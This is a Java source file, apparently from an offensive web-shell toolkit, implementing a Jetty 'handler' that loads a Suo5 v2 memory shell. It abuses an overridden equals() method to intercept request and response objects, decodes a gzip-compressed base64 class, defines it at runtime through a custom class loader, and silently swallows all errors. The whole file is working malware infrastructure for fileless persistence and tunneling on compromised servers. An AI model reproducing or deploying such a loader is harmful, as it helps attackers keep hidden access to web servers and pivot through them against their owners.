package com.reajason.javaweb.memshell.shelltool.suo5v2;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 * @since 2025/12/9
 */
public class Suo5v2JettyHandler extends ClassLoader {

    private static Class<?> suo5V2Class;
    private static String suo5V2GZipBase64;

    public Suo5v2JettyHandler() {
    }

    protected Suo5v2JettyHandler(ClassLoader parent) {
        super(parent);
    }

    @Override
    public boolean equals(Object obj) {
        Object[] args = ((Object[]) obj);
        Object baseRequest = null;
        Object request = null;
        Object response = null;
        if (args.length == 4) {
            Object arg4 = args[3];
            baseRequest = args[1];
            if (arg4 instanceof Integer) {
                // jetty6
                request = args[1];
                response = args[2];
            } else {
                request = args[2];
                response = args[3];
            }
        } else {
            // ee10
            request = args[0];
            response = args[1];
        }
        try {
            if (suo5V2Class == null) {
                byte[] bytes = gzipDecompress(decodeBase64(suo5V2GZipBase64));
                suo5V2Class = new Suo5v2JettyHandler(Thread.currentThread().getContextClassLoader()).defineClass(bytes, 0, bytes.length);
            }
            if (suo5V2Class.newInstance().equals(new Object[]{request, response})) {
                if (baseRequest != null) {
                    baseRequest.getClass().getMethod("setHandled", boolean.class).invoke(baseRequest, true);
                }
                return true;
            }
        } catch (Throwable ignored) {
        }
        return false;
    }


    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Throwable e) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }
}
